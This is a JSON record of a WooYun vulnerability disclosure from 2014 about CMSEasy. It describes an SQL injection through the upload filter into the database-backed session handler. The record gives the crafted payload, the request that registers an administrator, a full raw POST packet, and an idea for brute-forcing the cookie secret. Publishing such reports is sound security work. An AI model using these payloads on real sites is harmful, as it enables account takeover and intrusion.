{"id": 48741, "wybug_id": "wooyun-2014-076542", "wybug_title": "cmseasy 的一个高危漏洞（设计缺陷）", "wybug_corp": "cmseasy", "wybug_author": "Noxxx", "wybug_date": "2014-09-19 12:51", "wybug_open_date": "2014-12-18 12:52", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-18：\t细节向公众公开  简要描述： 这个可以做比较多的事。 详细说明：  因为他的session的机制是从 【数据库中取出 存入的】,所以有个注入点就可以操控他的session了。在 front_class.php 1509 - 1522行中 \nclass session {    static function get($key) {        if (isset($_SESSION[$key]))            return $_SESSION[$key];        else            return false;    }    static function set($key,$var) {        $_SESSION[$key]=$var;    }    static function del($key) {        unset($_SESSION[$key]);    }}\nsession类,一些初级的操作。构造函数中370行 \nnew stsession(new sessionox());\n因为有__autoload所以会自动载入文件.\nfinal class stsession {\tprivate $_path = null;\tprivate $_name = null;\tprivate $_db = null;\tprivate $_ip = null;\tprivate $_maxtime = 0;\tprivate $_prefix = '';\tpublic function __construct($db) {\t\tsession_set_save_handler(\t\t\tarray($this, 'open'),\t\t\tarray($this, 'close'),\t\t\tarray($this, 'read'),\t\t\tarray($this, 'write'),\t\t\tarray($this, 'destroy'),\t\t\tarray($this, 'gc')\t\t);\t\t//var_dump($db);\t\t$this->_db = $db;\t\t$this->_ip = $_SERVER['REMOTE_ADDR'];\t\t$this->_maxtime = ini_get('session.gc_maxlifetime');\t\t$config = config::get('database');\t\t$this->_prefix = isset($config['prefix']) ? $config['prefix'] : '';\t\tsession_start();\t\t$this->refresh(session_id());\t}\tpublic function open($path,$name) {\t\treturn true;\t}\tpublic function close(){\t\treturn true;\t}\tpublic function read($id)\t{\t\t$sql = \"SELECT * FROM {$this->_prefix}sessionox where PHPSESSID = '$id'\";\t\t//var_dump($sql);\t\t$res = $this->_db->query($sql);\t\tif (!$row = $this->_db->fetch_array($res)) {\t\t\treturn null;\t\t} elseif ($this->_ip != $row['client_ip']) {\t\t\tif(config::get('session_ip')){\t\t\t\treturn null;\t\t\t}else{ \t\t\t\treturn $row['data'];\t\t\t}\t\t} elseif ($row['update_time']+$this->_maxtime < time()){\t\t\t$this->destroy($id);\t\t\treturn null;\t\t} else {\t\t\treturn $row['data'];\t\t}\t}\tpublic function write($id,$data) {\t\t$sql = \"SELECT * FROM {$this->_prefix}sessionox where PHPSESSID = '$id'\";\t\t//var_dump($sql);\t\t$res = $this->_db->query($sql);\t\t$time = time();\t\t$row = $this->_db->fetch_array($res);\t\tif ($row) {\t\t\t//if ($row['data'] != $data) {\t\t\t$sql = \"UPDATE {$this->_prefix}sessionox SET update_time='$time',data='$data' WHERE PHPSESSID = '$id'\";\t\t\t$this->_db->query($sql);\t\t\t//}\t\t} else {\t\t\tif (!empty($data)) {\t\t\t\t$sql = \"INSERT INTO {$this->_prefix}sessionox (PHPSESSID, update_time, client_ip, data) VALUES ('$id','$time','$this->_ip','$data')\";\t\t\t\t$this->_db->query($sql);\t\t\t}\t\t}\t\treturn true;\t}\tpublic function destroy($id) {\t\t$sql = \"DELETE FROM {$this->_prefix}sessionox WHERE PHPSESSID = '$id'\";\t\t//var_dump($sql);\t\t$this->_db->query($sql);\t\treturn true;\t}\tpublic function refresh($id){\t\t$time = time();\t\t$sql = \"UPDATE {$this->_prefix}sessionox SET update_time='$time' WHERE PHPSESSID = '$id'\";\t\t//var_dump($sql);\t\t$this->_db->query($sql);\t\t$this->gc($this->_maxtime);\t}\tpublic function gc($maxtime){\t\t$time = time() - $maxtime;\t\t$sql = \"DELETE FROM {$this->_prefix}sessionox WHERE update_time <= '$time'\";\t\t//var_dump($sql);\t\t$this->_db->query($sql);\t\treturn true;\t}}\n这个功能就是将session数据存储到数据库。\nopen(string $savePath, string $sessionName)open 回调函数类似于类的构造函数， 在会话打开的时候会被调用。 这是自动开始会话或者通过调用 session_start() 手动开始会话 之后第一个被调用的回调函数。 此回调函数操作成功返回 TRUE，反之返回 FALSE。close()close 回调函数类似于类的析构函数。 在 write 回调函数调用之后调用。 当调用 session_write_close() 函数之后，也会调用 close 回调函数。 此回调函数操作成功返回 TRUE，反之返回 FALSE。read(string $sessionId)如果会话中有数据，read 回调函数必须返回将会话数据编码（序列化）后的字符串。 如果会话中没有数据，read 回调函数返回空字符串。在自动开始会话或者通过调用 session_start() 函数手动开始会话之后，PHP 内部调用 read 回调函数来获取会话数据。 在调用 read 之前，PHP 会调用 open 回调函数。read 回调返回的序列化之后的字符串格式必须与 write 回调函数保存数据时的格式完全一致。 PHP 会自动反序列化返回的字符串并填充 $_SESSION 超级全局变量。 虽然数据看起来和 serialize() 函数很相似， 但是需要提醒的是，它们是不同的。 请参考： session.serialize_handler。write(string $sessionId, string $data)在会话保存数据时会调用 write 回调函数。 此回调函数接收当前会话 ID 以及 $_SESSION 中数据序列化之后的字符串作为参数。 序列化会话数据的过程由 PHP 根据 session.serialize_handler 设定值来完成。序列化后的数据将和会话 ID 关联在一起进行保存。 当调用 read 回调函数获取数据时，所返回的数据必须要和 传入 write 回调函数的数据完全保持一致。PHP 会在脚本执行完毕或调用 session_write_close() 函数之后调用此回调函数。 注意，在调用完此回调函数之后，PHP 内部会调用 close 回调函数。\n可以参考官网给的解释。在这个类的构造函数中session_start();就打开了session,所以会依次执行下面的open  read  write closeread返回的是 :参见上面的说明 和serialize() 函数很相似,但是不是相同的。这里流程差不多说完了.------------------------下面就是漏洞的地方 在  tool_act.php 184行 uploadfile_action中这是一个上传的功能 其中有这样一条代码在200行\nif (!front::checkstr(@file_get_contents($file['tmp_name']))) {\ncheckstr函数 似乎是检查上传内容有没有一些危险代码吧。我们进去看看。front_class.php 673行 \nfunction checkstr($str) {        if (preg_match(\"/<(\\/?)(script|i?frame|style|html|body|title|link|meta)([^>]*?)>/is\",$str,$match)) { //检查有没有出现上面的代码，有的话就打印传给flash()函数。照样我们跟入。            front::flash(print_r($match,true));            return false;        }        if (preg_match(\"/(<[^>]*)on[a-zA-Z]+\\s*=([^>]*>)/is\",$str,$match)) {            return false;        }        return true;    }\n在573行\nstatic function flash($msg=null,$key='message') {        if (!isset($msg))            return self::showflash();        if (session::get($key))            $msg=session::get($key).'  '.$msg;        session::set($key,$msg);//很明显是写入session中,会触发stsession 类中的write 写入到数据库里,但是呢_FILES是不受转义限制的,所以我们可以任意操作session    }\n说明一下 write 流程是这样的 如果传入的 PHPSESSID 在表中没有记录的话就会插入一条记录 插入的$sql = \"INSERT INTO {$this->_prefix}sessionox (PHPSESSID, update_time, client_ip, data) VALUES ('$id','$time','$this->_ip','$data')\";这样的,不能任意操作data列的数据。列都定死了。如果里面有记录的话就会update UPDATE {$this->_prefix}sessionox SET update_time='$time',data='$data' WHERE PHPSESSID = '$id'\";我们可以闭合单引号,来达到任意写session数据的目的。---------------------------------------------------现在来闭合单引号  front::flash(print_r($match,true));用了print_r把所有的结果全部打印出来传给flash输入<script> 匹配的好几个结果.\narray(4) {  [0]=>  string(8) \"<script>\"  [1]=>  string(0) \"\"  [2]=>  string(6) \"script\"  [3]=>  string(0) \"\"}\n进入数据库是这样的（我这个是session表里已经有记录了的,没有记录的可以先请求一次<script>这个然后就有记录了。）因为他会把原先的数据会融合在一起的。\nUPDATE cmseasy_sessionox SET update_time='1411039331',data='message|s:146:\"Array(    [0] => <script>    [1] =>     [2] => script    [3] => )  Array(    [0] => <script>    [1] =>     [2] => script    [3] => )\";' WHERE PHPSESSID = 'q8v84kj42pnc0sh6624mf5b1'\n我研究了一下了 <script*/',DATA=111, client_ip=/*>这样就可以闭合单引号了。sql日志:\nUPDATE cmseasy_sessionox SET update_time='1411039651',data='message|s:124:\"Array(    [0] => <script*/',DATA=111, client_ip=/*>    [1] =>     [2] => script    [3] => */',DATA=111, client_ip=/*)\";' WHERE PHPSESSID = 'q8v84kj42pnc0sh6624mf5b1'\n现在我们只需要按照他的格式来写入DATA列里就可以了 他这个格式和 serialize相似session的名字 |隔开 s 字符串 124长度 xxxx值 ;结束message|s:4:\"xxxx\";------------------找了个地方可以直接注册管理员 或提升管理员 做个演示把。在user_act.php respond_action函数中\n$data=array(                        'username'=>$username,                        'password'=>$password,                        'groupid'=>101,                        'userip'=>front::ip(),                        $classname=>session::get('openid'),                );\n这个$classname =  front::$get['ologin_code']; 也就是等于 $_GET['ologin_code']我们可以直接把 groupid这个数组覆盖掉 因为 session::get('openid')已经可以控制的。  【这里插一句,之前没发现这个漏洞的时候我看到这里 发现了这个问题，之前的想法是 把password覆盖掉，因为session::get('openid')值是空的，注册成功后 所以底下会有个setcookie的地方。password 会被加密掉 加密方式就是 md5($_password.config::get('cookie_password'))这个 因为 我们的密码是空的 ,所以获得了 config::get('cookie_password')密码的md5值。而这个 cookie安全码是这样获得 config::modify(array('cookie_password' => md5(rand() . time())));rand+安装时间。测试了 在windows下rand()生成的数字是不大于32768的.（自己在kail下测试生成的数非常大。。。）但是这样前提是知道安装时间才行..暴力破解的话 （一秒钟就需要3万条。）数量太大了。寻找安装时间,只能通过保存快照的一些网站入手了,但是这个效果不理想.（得到cookie安全码就可以注射。）】（ps 下这里下面还有个登录的地方也是可以的\n$post[$classname] = session::get('openid');                $this->_user->rec_update($post, 'userid=' . $row['userid']);\n）---------------------------------------------------------------------------。   漏洞证明：  先让你的sessiono里有数据存入,我演示就用新的sessionid把\n\n数据库里已经有了\n\n然后在写入我们的session数据openid|s:1:\"2\"; 转换成hex,好了提交成功了\n<script*/',DATA=0x6F70656E69647C733A313A2232223B, client_ip=/*>\n\n\n然后我们在来注册。（我先把我的新的session换上去）\n\nhttp://127.0.0.1/cmseasy/index.php?case=user&act=respond&ologin_code=groupidPOST提交 regsubmit=1&username=test_Noxxx&password=test_Noxxx提交了自动转跳了 ，\n\n看看数据库里\n\n好了 ，直接能登录后台\n\n这个更改附件类型 应该可以直接上传php文件吧。【附上POST包】：\nPOST /cmseasy/index.php?case=tool&act=uploadfile&isdebug=1 HTTP/1.1Host: 127.0.0.1Proxy-Connection: keep-aliveContent-Length: 245Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: nullUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.103 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQENA9lBHWS8l97FJAccept-Encoding: gzip,deflateAccept-Language: zh-CN,zh;q=0.8Cookie: PHPSESSID=q8v84kj42pnc0AAA624mf5bA------WebKitFormBoundaryQENA9lBHWS8l97FJContent-Disposition: form-data; name=\"data\"; filename=\"test.jpg\"Content-Type: image/jpeg<script*/',DATA=0x6F70656E69647C733A313A2232223B, client_ip=/*>------WebKitFormBoundaryQENA9lBHWS8l97FJ--\n   修复方案：  你们专业   版权声明：转载请注明来源 Noxxx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-09-20 07:48 厂商回复： 感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-10 09:45 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  牛逼，拜读了..    \n     2014-10-10 12:46 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  腻害。。    \n     2014-10-18 13:08 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  牛逼，拜读了..    \n     2014-12-21 22:54 |    \t\tlaoyao \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:5        | ด้้้้้็็็็็้้้้้็็็็...)\t\t \n  牛逼，拜读了    \n     2015-05-18 11:31 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  牛逼，拜读了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}